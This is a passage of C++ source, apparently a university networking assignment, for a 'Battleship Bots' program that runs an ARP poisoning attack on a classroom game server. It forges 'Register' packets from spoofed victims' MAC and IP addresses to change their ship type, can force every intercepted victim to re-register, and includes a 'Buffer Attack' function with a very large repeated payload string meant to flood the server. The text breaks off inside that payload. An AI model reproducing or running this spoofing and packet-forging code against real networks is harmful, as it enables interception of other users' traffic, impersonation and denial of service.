			studId = studentId; studFName = studentFName; studLName = studentLName; studType = (int)shipType;

			// > Modify our command variables
			studType = -1;											// < Update the ship type to -1 (fake ship)
			regCmdTempLength = strlen(regCmdTemp);					// < Update the length of our new 'Register' command

			// > Create our new command
			//arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "[MODIFY]: Student ID: %s, FName: %s, LName: %s, Type: %d\n", studId, studFName, studLName, studType);
			sprintf_s(regCmdTemp, "Register  %s,%s,%s,%d", studId, studFName, studLName, studType);

			// > Move our command to an unsigned char buffer
			regCmdTempULen = strlen((char*)regCmdTempUnsigned);		// < Update our u_char length
			for (i = 0; i < regCmdTempLength; i++)
				regCmdTempUnsigned[i] = regCmdTemp[i];

			// > Calculate the correct length of our new buffer
			for (i = 0; i < regCmdTempULen; i++)
			{
				if (regCmdTempUnsigned[i] == '\0')
				{
					regCmdTempULen = i;
					break;
				}
			}

			// > If their ship type is already -1, don't respawn them
			if ((int)shipType != -1)
			{
				// > Debug
				arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), " ");
				arpCnsl.update(6 + ourVictimIndex, "[%s] -> Tried to 'Register', ship type changed to %d      ", iptos(spoofData[ourVictimIndex].ip), studType);

				// > Create and send our new 'Register' command packet from our spoofed victim
				RawPacket RP;
				RP.CreatePacket(spoofData[ourVictimIndex].mac, srv_mac, spoofData[ourVictimIndex].ip, ARP_SERVER_IP, 60666, 1924, regCmdTempUnsigned, regCmdTempULen);
				RP.SendPacket(adhandle);
			}
		}
	
		// > Extra Features
		// -> Force Respawn causes all bots to be register as the ship type of -1
		if (forceRespawn)
		{
			RawPacket RP2;
			u_char changeNames[26] = { 'R', 'e', 'g', 'i', 's', 't', 'e', 'r', ' ', ' ', 'I', 'M', ' ', 'S', 'O', 'R', 'R', 'Y', ':', '(', ',', 'n', ',', 'l', ',', (char)-1 };
			RP2.CreatePacket(spoofData[ourVictimIndex].mac, srv_mac, spoofData[ourVictimIndex].ip, ARP_SERVER_IP, 60666, 1924, changeNames, 26);
			RP2.SendPacket(adhandle);
		}
	}

	// > Check if the user is trying to disable ARP Spoofing
	while (_kbhit())
	{
		if (tolower(_getch()) == 'o' && arpEnabled)
		{
			// > Update our flag
			arpEnabled = false;
			isArping = false;

			// > Clear Console
			arpCnsl.cls();

			// > Display Header
			arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_INTENSITY), "     ___       _   _   _           _     _           \n");
			arpCnsl.printf("    / __\\ __ _| |_| |_| | ___  ___| |__ (_)_ __  ___ \n");
			arpCnsl.printf("   /__\\/// _` | __| __| |/ _ \\/ __| '_ \\| | '_ \\/ __|\n");
			arpCnsl.printf("  / \\/  \\ (_| | |_| |_| |  __/\\__ \\ | | | | |_) \\__ \\\n");
			arpCnsl.printf("  \\_____/\\__,_|\\__|\\__|_|\\___||___/_| |_|_| .__/|___/\n");
			arpCnsl.printf("                                          |_|        \n");
			arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "                   Battleship Bots                   \n");
			arpCnsl.printf("        Bot created by Reece Benson - 16021424       \n");
			arpCnsl.printf("           UWE Computer and Network Systems          \n");
			arpCnsl.printf("                    Assignment  2                    \n");
			arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE), "-----------------------------------------------------\n");

			// > Update UI
			arpCnsl.printf("-> Deinitialising the ARP Poisoning attack, please allow 15 seconds.\n");
			arpCnsl.printf("-> To reinitialise the attack, hold 'P' to start again.");
			ipCount = 0;

			// > Break this loop
			pcap_breakloop(adhandle);
		}
		else if (tolower(_getch()) == 'z')
		{
			forceRespawn = !forceRespawn; // < Toggle State

			// > Update UI
			if (forceRespawn)
			{
				arpCnsl.update(6 + ipCount + 10, "[STATE] Forcing respawn from all IP addresses.");
			}
			else
			{
				arpCnsl.update(6 + ipCount + 10, "[STATE] No longer forcing a respawn from any IP Addresses.");
			}
		}
	}

	// > Check if ARP Spoofing has been disabled (fallback)
	if (!arpEnabled && adhandle != NULL)
	{
		// > We use a try/exception here to make sure our program doesn't error
		try
		{
			pcap_breakloop(adhandle);	// < Break our loop (packet_handler)
		}
		catch (...) {}
	}
}

void setupArp()
{
	// > Create ARP Console on this thread
	arpCnsl.Create("ARP Spoofing | Battleship Bots by Reece Benson");

	// > Display Header
	arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_INTENSITY), "     ___       _   _   _           _     _           \n");
	arpCnsl.printf("    / __\\ __ _| |_| |_| | ___  ___| |__ (_)_ __  ___ \n");
	arpCnsl.printf("   /__\\/// _` | __| __| |/ _ \\/ __| '_ \\| | '_ \\/ __|\n");
	arpCnsl.printf("  / \\/  \\ (_| | |_| |_| |  __/\\__ \\ | | | | |_) \\__ \\\n");
	arpCnsl.printf("  \\_____/\\__,_|\\__|\\__|_|\\___||___/_| |_|_| .__/|___/\n");
	arpCnsl.printf("                                          |_|        \n");
	arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "                   Battleship Bots                   \n");
	arpCnsl.printf("        Bot created by Reece Benson - 16021424       \n");
	arpCnsl.printf("           UWE Computer and Network Systems          \n");
	arpCnsl.printf("                    Assignment  2                    \n");
	arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE), "-----------------------------------------------------\n");

	// > Update UI
	arpCnsl.update(0, " > Waiting to initialise ARP Spoofing. Press 'P' to enable.\n");

	// > Listen to our keyboard input to handle ARP Attacks
	while (true)
	{
		// > Check if our user is toggling the ARP attack state
		while (_kbhit())
		{
			if (tolower(_getch()) == 'p' && !arpEnabled)
			{
				// > Update our flag
				arpEnabled = true;

				// > Update UI
				arpCnsl.update(0, " > ARP Spoofing has been enabled!                            \n");

				// > Start ARP Spoofing
				//std::thread spam(dataSpammer);
				//arpSpoof();

				// > Sleep the thread so it doesn't toggle on & off rapidly
				//spam.join();
				Sleep(500);
			}
		}
		
		// > Sleep so this thread doesn't freeze
		Sleep(1);
	}
}

// ------------------------
// -> Buffer Attack
// ------------------------
void dataSpammer()
{
	// > Only start this data attack when we're ARP Spoofing
	while (!isArping)
		Sleep(1);

	// > Variables
	int		i;
	u_char	cmd[16384] = "69,69,69,69 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | DEAD | 69,69,69,69 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 2,3,4,5,6 | 